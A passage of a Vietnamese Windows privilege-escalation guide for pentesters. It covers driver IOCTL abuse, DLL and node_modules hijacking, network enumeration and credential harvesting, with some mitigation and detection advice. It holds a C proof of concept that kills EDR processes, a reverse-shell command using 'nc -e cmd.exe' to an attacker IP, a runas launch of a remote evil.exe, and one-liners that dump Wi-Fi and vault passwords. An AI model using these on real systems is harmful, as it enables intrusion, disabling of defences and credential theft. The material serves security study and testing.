Mẫu tìm kiếm hiệu quả: **các lần đọc registry với kiểu dữ liệu khác nhau vào cùng một biến stack mà không khởi tạo lại biến đó**. Tìm bằng grep `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, các con trỏ `EntryContext` được dùng lại và những luồng thực thi mà lần đọc registry đầu tiên quyết định có thực hiện lần đọc thứ hai hay không.

#### Lạm dụng việc thiếu FILE_DEVICE_SECURE_OPEN trên device object (LPE + EDR kill)

Một số driver bên thứ ba có chữ ký tạo device object với SDDL chặt chẽ bằng IoCreateDeviceSecure nhưng quên đặt FILE_DEVICE_SECURE_OPEN trong DeviceCharacteristics. Nếu thiếu cờ này, secure DACL sẽ không được thực thi khi device được mở qua một đường dẫn có thêm thành phần, cho phép bất kỳ người dùng không có đặc quyền nào lấy được handle bằng cách dùng đường dẫn namespace như:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (trong một trường hợp thực tế)

Khi người dùng có thể mở device, họ có thể lạm dụng các IOCTL đặc quyền mà driver cung cấp để thực hiện LPE và can thiệp. Một số khả năng đã được quan sát trong thực tế:
- Trả về handle có toàn quyền truy cập đến các process bất kỳ (đánh cắp token / mở shell SYSTEM qua DuplicateTokenEx/CreateProcessAsUser).
- Đọc/ghi raw disk không hạn chế (can thiệp offline, thủ thuật duy trì hiện diện lúc khởi động).
- Kết thúc các process bất kỳ, kể cả Protected Process/Light (PP/PPL), cho phép hạ AV/EDR từ user mode thông qua kernel.

Mẫu PoC tối giản (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Các biện pháp giảm thiểu dành cho nhà phát triển
- Luôn đặt FILE_DEVICE_SECURE_OPEN khi tạo các đối tượng thiết bị cần được giới hạn bằng DACL.
- Xác thực ngữ cảnh của caller đối với các thao tác đặc quyền. Thêm các bước kiểm tra PP/PPL trước khi cho phép chấm dứt process hoặc trả về handle.
- Giới hạn IOCTL (access mask, METHOD_*, xác thực đầu vào) và cân nhắc dùng mô hình broker thay vì cấp trực tiếp quyền kernel.

Ý tưởng phát hiện dành cho đội phòng thủ
- Giám sát các lần mở từ user mode đối với tên thiết bị đáng ngờ (ví dụ: \\ .\\amsdk*) và các chuỗi IOCTL cụ thể có dấu hiệu bị lạm dụng.
- Thực thi danh sách chặn driver dễ bị khai thác của Microsoft (HVCI/WDAC/Smart App Control) và duy trì danh sách allow/deny của riêng bạn.


## PATH DLL Hijacking

Nếu bạn có **quyền ghi trong một thư mục nằm trên PATH**, bạn có thể chiếm quyền DLL được một process tải và **leo thang đặc quyền**.<sup>[[2]](#references)</sup>

Kiểm tra quyền của tất cả thư mục trong PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Để biết thêm thông tin về cách khai thác kiểm tra này:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Chiếm quyền điều khiển quá trình phân giải module của Node.js / Electron qua `C:\node_modules`

Đây là một biến thể **Windows uncontrolled search path**, ảnh hưởng đến các ứng dụng **Node.js** và **Electron** khi chúng thực hiện bare import như `require("foo")` nhưng module được yêu cầu **không tồn tại**.<sup>[[20]](#references)</sup>

Node phân giải package bằng cách đi ngược lên cây thư mục và kiểm tra các thư mục `node_modules` ở mỗi thư mục cha. Trên Windows, quá trình này có thể đi đến thư mục gốc của ổ đĩa, vì vậy ứng dụng được khởi chạy từ `C:\Users\Administrator\project\app.js` có thể sẽ kiểm tra các đường dẫn sau:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Nếu **người dùng có quyền thấp** có thể tạo `C:\node_modules`, họ có thể đặt một tệp `foo.js` độc hại (hoặc một thư mục package) tại đó và chờ **tiến trình Node/Electron có quyền cao hơn** phân giải dependency bị thiếu. Payload sẽ chạy trong ngữ cảnh bảo mật của tiến trình nạn nhân, do đó có thể dẫn đến **LPE** bất cứ khi nào mục tiêu chạy với quyền administrator, trong tác vụ được lên lịch/service wrapper chạy ở chế độ elevated, hoặc trong ứng dụng desktop có quyền cao tự khởi động.

Tình huống này đặc biệt phổ biến khi:

- một dependency được khai báo trong `optionalDependencies`<sup>[[22]](#references)</sup>
- thư viện bên thứ ba đặt `require("foo")` trong `try/catch` và tiếp tục chạy khi gặp lỗi
- một package bị gỡ khỏi bản build production, bị bỏ sót khi đóng gói hoặc cài đặt thất bại
- lệnh `require()` dễ bị tấn công nằm sâu trong cây dependency thay vì trong mã nguồn chính của ứng dụng

### Tìm kiếm mục tiêu dễ bị tấn công

Dùng **Procmon** để xác minh đường dẫn phân giải:<sup>[[23]](#references)</sup>

- Lọc theo `Process Name` = tệp thực thi mục tiêu (`node.exe`, tệp EXE của ứng dụng Electron hoặc tiến trình wrapper)
- Lọc theo `Path` `contains` `node_modules`
- Tập trung vào `NAME NOT FOUND` và lần mở thành công cuối cùng bên dưới `C:\node_modules`

Các mẫu hữu ích để rà soát mã trong tệp `.asar` đã giải nén hoặc mã nguồn ứng dụng:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Khai thác

1. Xác định **tên package còn thiếu** từ Procmon hoặc qua rà soát mã nguồn.
2. Tạo thư mục tra cứu root nếu thư mục đó chưa tồn tại:

```powershell
mkdir C:\node_modules
```

3. Đặt một module với đúng tên được mong đợi:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kích hoạt ứng dụng nạn nhân. Nếu ứng dụng thử `require("foo")` và module hợp lệ không tồn tại, Node có thể tải `C:\node_modules\foo.js`.

Các ví dụ thực tế về module tùy chọn bị thiếu phù hợp với mẫu này gồm `bluebird` và `utf-8-validate`, nhưng **kỹ thuật** mới là phần có thể tái sử dụng: tìm bất kỳ **bare import** nào bị thiếu mà một tiến trình Node/Electron có đặc quyền trên Windows sẽ phân giải.

### Ý tưởng phát hiện và tăng cường bảo mật

- Cảnh báo khi người dùng tạo `C:\node_modules` hoặc ghi các tệp/gói `.js` mới vào đó.
- Tìm các tiến trình có integrity cao đang đọc từ `C:\node_modules\*`.
- Đóng gói tất cả runtime dependency trong môi trường production và kiểm tra việc sử dụng `optionalDependencies`.
- Rà soát mã bên thứ ba để tìm các mẫu `try { require("...") } catch {}` không đưa ra cảnh báo.
- Tắt các phép thăm dò tùy chọn nếu thư viện hỗ trợ (ví dụ: một số cách triển khai `ws` có thể tránh phép thăm dò `utf-8-validate` kiểu cũ bằng `WS_NO_UTF_8_VALIDATE=1`).

## Mạng

### Chia sẻ

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Kiểm tra các máy tính đã biết khác được ghi cứng trong hosts file

```
type C:\Windows\System32\drivers\etc\hosts
```

### Giao diện mạng & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Cổng đang mở

Kiểm tra các dịch vụ bị hạn chế từ bên ngoài

```bash
netstat -ano #Opened ports?
```

Đối với một listener cục bộ, đối chiếu PID với chủ sở hữu tiến trình, đường dẫn executable và service hoặc scheduled task khởi chạy nó. Một service điều khiển từ xa chỉ có thể cấp quyền truy cập với tư cách người dùng desktop nếu cơ chế xác thực và các biện pháp kiểm soát lệnh cho phép. Một ứng dụng TCP tùy chỉnh chạy bằng tài khoản có đặc quyền cao hơn là mục tiêu cần rà soát riêng: listener và đường dẫn binary chỉ là manh mối thụ động, còn khai thác lỗi memory corruption qua một đường dẫn đã xác thực đòi hỏi phân tích chính binary đó và đầu vào mà nó có thể tiếp nhận. Nếu có vẻ một cổng đang mở thuộc về tiến trình hệ thống, hãy đối chiếu với [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) trước khi xác định service backend; chỉ riêng một quy tắc chuyển tiếp không chứng minh được đích có thể truy cập hoặc dễ bị tấn công.

### Bảng định tuyến

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Bảng ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Quy tắc Firewall

[**Xem trang này để biết các lệnh liên quan đến Firewall**](../basic-cmd-for-pentesters.md#firewall) **(liệt kê quy tắc, tạo quy tắc, tắt, tắt...)**

Xem thêm[ các lệnh liệt kê mạng tại đây](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` cũng có thể được tìm thấy tại `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Nếu có quyền người dùng root, bạn có thể lắng nghe trên bất kỳ cổng nào (lần đầu tiên dùng `nc.exe` để lắng nghe trên một cổng, một hộp thoại GUI sẽ hỏi có cho phép `nc` thông qua firewall hay không).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Để dễ dàng khởi chạy bash với quyền root, bạn có thể thử `--default-user root`

Bạn có thể khám phá hệ thống tệp `WSL` trong thư mục `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

`root` trong Linux bên trong WSL không tự cấp quyền Windows Administrator. Nếu danh tính Windows hiện tại có thể đọc hệ thống tệp của một bản phân phối, hãy kiểm tra các tệp lịch sử shell (bao gồm `/root/.bash_history`) để tìm các lệnh có thể đã ghi lại thông tin xác thực; tuy nhiên, việc leo thang vẫn cần một tài khoản có đặc quyền cao hơn hợp lệ và một phương thức xác thực được phép. Cấu trúc `LocalState\rootfs` áp dụng cho các bản cài đặt WSL cũ; WSL 2 thường lưu trữ bản phân phối trong một [đĩa ảo `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), vì vậy hãy xác định bản phân phối và đường dẫn lưu trữ thực tế trước. Tránh in nội dung lịch sử trong quá trình liệt kê tự động.

## Thông tin xác thực Windows

### Thông tin xác thực Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Coi `DefaultUserName` và `DefaultDomainName` là ngữ cảnh tài khoản, không phải thông tin xác thực. Giá trị `DefaultPassword` hoặc `AltDefaultPassword` không rỗng là một phát hiện về mật khẩu dạng văn bản thuần trong registry. Nếu `AutoAdminLogon=1` nhưng không đọc được mật khẩu dạng văn bản thuần, thì đó chỉ là một manh mối: [Sysinternals Autologon có thể lưu mật khẩu dưới dạng LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), và việc đọc registry thông thường không xác định được liệu secret đó có tồn tại hoặc có thể truy xuất hay không. Hãy xem xét quyền truy cập và cấu hình đăng nhập thực tế trước khi báo cáo việc lộ thông tin xác thực.

### Trình quản lý thông tin xác thực / Windows Vault

Trích từ [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault lưu trữ thông tin xác thực cho máy chủ, website và các chương trình khác mà **Windows** có thể dùng để **tự động đăng nhập người dùng**. Thoạt đầu, điều này có thể khiến bạn nghĩ rằng người dùng có thể lưu thông tin xác thực cho các trang như Facebook, Twitter hoặc Gmail để trình duyệt tự động đăng nhập, nhưng cơ chế này không hoạt động như vậy.

Windows Vault lưu trữ thông tin xác thực mà Windows có thể dùng để tự động đăng nhập người dùng. Điều đó có nghĩa là mọi **ứng dụng Windows cần thông tin xác thực để truy cập tài nguyên** (máy chủ hoặc website) **đều có thể sử dụng Credential Manager** và Windows Vault để dùng thông tin xác thực đã cung cấp, thay vì yêu cầu người dùng nhập tên người dùng và mật khẩu mỗi lần.

Trừ khi các ứng dụng tương tác với Credential Manager, tôi không nghĩ chúng có thể sử dụng thông tin xác thực cho một tài nguyên cụ thể. Vì vậy, nếu ứng dụng của bạn muốn sử dụng vault, nó cần **giao tiếp với credential manager và yêu cầu thông tin xác thực cho tài nguyên đó** từ vault lưu trữ mặc định.

Dùng `cmdkey` để liệt kê thông tin xác thực được lưu trữ trên máy.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Sau đó bạn có thể dùng `runas` với tùy chọn `/savecred` để sử dụng thông tin xác thực đã lưu. Ví dụ sau gọi một binary từ xa thông qua SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sử dụng `runas` với một bộ thông tin xác thực được cung cấp.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Lưu ý rằng mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), hoặc module [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Các ứng dụng UWP hiện đại của Windows, Microsoft Edge và các dịch vụ hệ thống hiện đại lưu trữ token xác thực và mật khẩu dạng văn bản thuần bên trong `PasswordVault` của Universal Windows Platform (UWP) (cũng hiển thị dưới dạng `Web Credentials` trong `vaultcmd`). Không gian lưu trữ này được cô lập theo phiên và có thể được giải mã nguyên bản mà không cần quyền quản trị hoặc `SeDebugPrivilege`.

Thực thi lệnh PowerShell này trong phiên đang hoạt động của người dùng để dump và giải mã ngay lập tức tất cả tên người dùng và mật khẩu dạng văn bản thuần đã lưu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** cung cấp phương thức mã hóa dữ liệu đối xứng, chủ yếu được sử dụng trong hệ điều hành Windows để mã hóa đối xứng các khóa riêng bất đối xứng. Cơ chế mã hóa này sử dụng bí mật của người dùng hoặc hệ thống để góp phần đáng kể vào entropy.

**DPAPI cho phép mã hóa khóa bằng khóa đối xứng được tạo từ thông tin bí mật đăng nhập của người dùng**. Trong các trường hợp mã hóa hệ thống, cơ chế này sử dụng thông tin bí mật xác thực miền của hệ thống.

Các khóa RSA của người dùng được mã hóa bằng DPAPI được lưu trong thư mục `%APPDATA%\Microsoft\Protect\{SID}`, trong đó `{SID}` đại diện cho [định danh bảo mật](https://en.wikipedia.org/wiki/Security_Identifier) của người dùng. **Khóa DPAPI, nằm cùng tệp với khóa chính bảo vệ các khóa riêng của người dùng**, thường gồm 64 byte dữ liệu ngẫu nhiên. (Lưu ý rằng quyền truy cập vào thư mục này bị hạn chế, nên không thể liệt kê nội dung bằng lệnh `dir` trong CMD, nhưng có thể liệt kê bằng PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Bạn có thể dùng **mimikatz module** `dpapi::masterkey` cùng các đối số phù hợp (`/pvk` hoặc `/rpc`) để giải mã nó.

Các **tệp thông tin xác thực được bảo vệ bằng mật khẩu chính** thường nằm ở:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Bạn có thể dùng **mimikatz module** `dpapi::cred` với `/masterkey` phù hợp để giải mã.\
Bạn có thể **trích xuất nhiều DPAPI** **masterkeys** từ **memory** bằng module `sekurlsa::dpapi` (nếu bạn là root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Thông tin xác thực PowerShell

**Thông tin xác thực PowerShell** thường được dùng cho các tác vụ **scripting** và tự động hóa, giúp lưu trữ thông tin xác thực đã mã hóa một cách thuận tiện. Thông tin xác thực được bảo vệ bằng **DPAPI**, thường có nghĩa là chỉ cùng người dùng trên cùng máy tính nơi chúng được tạo mới có thể giải mã chúng.

Tệp thông tin xác thực đã xuất có thể có tên tệp hoặc đường dẫn `.xml` bất kỳ. Khi một script hoặc bản kiểm kê tệp dẫn đến tệp đó, hãy xác định thư mục hồ sơ thực tế của tài khoản thay vì mặc định là `C:\Users`: [Windows có thể đặt hồ sơ ở nơi khác](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Một tệp có thể đọc được chỉ là manh mối; [Windows `Export-Clixml` liên kết thông tin xác thực đã mã hóa với người dùng và máy tính thực hiện thao tác xuất](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), và mọi tài khoản được khôi phục đều phải có quyền hợp lệ trên dịch vụ dự định sử dụng. Trước tiên, hãy kiểm tra đường dẫn và ACL mà không in các giá trị đã mã hóa hoặc văn bản thuần trong quá trình kiểm kê thông thường.

Để **giải mã** thông tin xác thực PS từ tệp chứa chúng, bạn có thể làm như sau:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Các kết nối RDP đã lưu

Bạn có thể tìm thấy chúng tại `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
và trong `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Các lệnh đã chạy gần đây

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Trình quản lý thông tin xác thực Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use module `dpapi::rdg` của **Mimikatz** cùng `/masterkey` phù hợp để **giải mã mọi file .rdg**\
Bạn có thể **trích xuất nhiều DPAPI masterkey** từ bộ nhớ bằng module `sekurlsa::dpapi` của Mimikatz

**mRemoteNG sử dụng kho lưu trữ kết nối khác.** Kiểm tra các XML có thể đọc được trong `%APPDATA%\mRemoteNG` và thư mục Documents của người dùng, bao gồm các file có tên thông thường như `config.xml`. Xác định schema kết nối và các thuộc tính `Password` được mã hóa trước khi xem file XML là đầu mối chứa thông tin xác thực. Giá trị được lưu trữ không phải là mật khẩu DPAPI/RDCMan; việc khôi phục phụ thuộc vào cài đặt mã hóa của file và việc có sử dụng mật khẩu chủ tùy chỉnh hay không. Tránh in các giá trị đã mã hóa khi liệt kê trên diện rộng.

**Các bản xuất profile của Remote Desktop Plus** cũng có thể đọc được trong thư mục người dùng hoặc thư mục quản trị dùng chung. Bản xuất `profiles.xml` cũ có các mục `Data/Profile` với phần tử `ProfileName`, `Password` và `Secure`. Hãy xem phần tử mật khẩu không rỗng là một đầu mối chứa thông tin xác thực, nhưng đừng in giá trị đó hoặc cho rằng nó là plaintext: [nhà cung cấp ghi chú](https://www.donkz.nl/) rằng cơ chế bảo vệ profile có thể gắn với tài khoản và máy tính đã tạo profile, hoặc được cấu hình ít nghiêm ngặt hơn. Hãy xác minh nguồn gốc file và điều kiện khôi phục trước khi dựa vào nó.

### Sticky Notes

Mọi người thường dùng ứng dụng StickyNotes trên máy trạm Windows để **lưu mật khẩu** và thông tin khác mà không nhận ra đây là một file cơ sở dữ liệu. File này nằm tại `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` và luôn đáng để tìm kiếm, kiểm tra.

Đôi khi mọi người lưu mật khẩu và thông tin khác trong các ứng dụng ghi chú. Ứng dụng Sticky Notes dạng đóng gói của Microsoft thường lưu ghi chú tại `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; các ứng dụng cũ hơn hoặc khác có thể dùng những kho lưu trữ khác trong hồ sơ người dùng, bao gồm LevelDB. Hãy xác định ứng dụng đã cài đặt và định dạng lưu trữ trước khi cho rằng không tìm thấy file SQLite đồng nghĩa với việc không có ghi chú.

Nếu Sticky Notes đang sử dụng write-ahead logging của SQLite, chỉ sao chép `plum.sqlite` có thể bỏ sót các ghi chú đã commit gần đây. Hãy giữ lại `plum.sqlite-wal` tương ứng cùng với bản sao cơ sở dữ liệu nhất quán, và kèm theo `plum.sqlite-shm` nếu có; chỉ mục bộ nhớ dùng chung có thể được dựng lại, nhưng WAL là một phần của trạng thái bền vững của cơ sở dữ liệu. Xem [tài liệu WAL của SQLite](https://www.sqlite.org/wal.html). Ghi chú có tên tài khoản hoặc mật khẩu chỉ là một đầu mối chứa thông tin xác thực: hãy xác minh riêng tài khoản, quyền truy cập được phép và việc tái sử dụng mật khẩu. Bản ghi trong password manager đã mã hóa còn cần khóa giải mã thực tế và cách diễn giải riêng của ứng dụng trước khi có thể xác nhận khả năng đăng nhập với quyền cao hơn.

### AppCmd.exe

**Lưu ý rằng để khôi phục mật khẩu từ AppCmd.exe, bạn cần có quyền Administrator và chạy ở mức High Integrity.**\
**AppCmd.exe** nằm trong thư mục `%systemroot%\system32\inetsrv\`.\
Nếu file này tồn tại thì có thể một số **thông tin xác thực** đã được cấu hình và có thể **khôi phục**.

Đoạn mã này được trích xuất từ [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Kiểm tra xem `C:\Windows\CCM\SCClient.exe` có tồn tại không .\
Các trình cài đặt **được chạy với quyền SYSTEM**, nhiều trình dễ bị **DLL Sideloading (Thông tin từ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Tệp và Registry (Thông tin xác thực)

### Dấu vết thông tin xác thực trong Registry của công cụ hỗ trợ

Một số bản cài đặt hỗ trợ từ xa cũ lưu các tên value liên quan đến mật khẩu trong những khóa Registry cố định của ứng dụng. Ví dụ, theo [giải thích của nhà cung cấp về khóa Registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` của TeamViewer xác định mật khẩu phiên tĩnh đã cấu hình trong các phiên bản trước phiên bản 9. Dấu tên value chỉ là gợi ý để rà soát: hãy xác minh phiên bản đã cài đặt, dữ liệu value có thể đọc được, định dạng và hành vi xác thực hiện tại trước khi đánh giá thông tin xác thực đó. Muốn chuyển từ mật khẩu hỗ trợ từ xa sang tài khoản Windows có đặc quyền cao hơn còn cần mật khẩu thực sự được dùng lại và tài khoản đó được cấp quyền. Không đưa ciphertext và mật khẩu đã khôi phục vào đầu ra liệt kê thông thường.

### Bảng tính dùng chung có sheet được bảo vệ

Nếu nghi ngờ một workbook dùng chung có thể đọc được chứa dữ liệu tài khoản, hãy phân biệt **mã hóa tệp** với bảo vệ worksheet hoặc cột bị ẩn. [Microsoft nêu rõ](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) rằng bảo vệ worksheet kiểm soát việc chỉnh sửa, không phải là tính năng bảo mật; tự nó không chứng minh nội dung workbook đã được mã hóa. Chỉ rà soát các tệp được phép truy cập và có liên quan, đồng thời tránh in các bí mật tiềm năng trong quá trình liệt kê trên diện rộng. Chỉ riêng đường dẫn `.xlsx` có thể đọc được, sheet được bảo vệ hoặc cột bị ẩn không chứng minh rằng có thông tin xác thực hay bất kỳ tài khoản nào có đặc quyền cao hơn; hãy xác minh riêng dữ liệu thực tế và quyền hiện tại của tài khoản.

### Các bản vá thay đổi được lưu lại trên máy chủ CI

Máy chủ CI có thể giữ lại các thay đổi mã nguồn đã gửi trong thư mục dữ liệu ngay cả sau khi quá trình build kết thúc. [TeamCity ghi rõ](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` dùng để lưu các thay đổi từ remote run; thư mục dữ liệu có thể được cấu hình và không nhất thiết nằm dưới `ProgramData`. Bản vá có thể đọc được có thể lưu lại tham chiếu đã bị xóa hoặc được thêm vào một tệp thông tin xác thực, khóa mã hóa hoặc script sử dụng cả hai. Ví dụ, quy trình PowerShell `ConvertTo-SecureString -Key` cần AES key cũng như chuỗi đã mã hóa; [Microsoft ghi rõ](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) rằng key được cung cấp riêng. Trước tiên, chỉ rà soát tên các bản vá có thể truy cập; sau đó, khi được cấp quyền, kiểm tra nội dung liên quan mà không in bí mật vào đầu ra liệt kê thông thường. Chỉ riêng đường dẫn bản vá, giá trị đã mã hóa hoặc tham chiếu đến key không chứng minh thông tin xác thực hợp lệ hay khả năng truy 